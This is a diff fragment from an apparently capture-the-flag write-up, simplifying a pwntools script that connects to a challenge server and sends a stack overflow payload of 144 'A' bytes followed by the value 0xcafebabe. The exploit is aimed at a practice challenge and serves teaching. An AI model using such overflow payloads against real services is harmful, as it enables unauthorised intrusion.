@@ -201,14 +201,12 @@ This can even be simplified by using the [packing](http://docs.pwntools.com/en/s
 ```
 #!/usr/bin/python
 
-import pwn
-import struct
+from pwn import *
 
-p = pwn.remote( "areyouawake.chals.fuzzy.land", 5503 )
-#p = pwn.process( "./awake" )
+p = remote( "areyouawake.chals.fuzzy.land", 5503 )
 
 payload = "A" * 144
-payload += pwn.p32( 0xcafebabe )
+payload += p32( 0xcafebabe )
 
 print( p.recv() )
 p.sendline( payload )
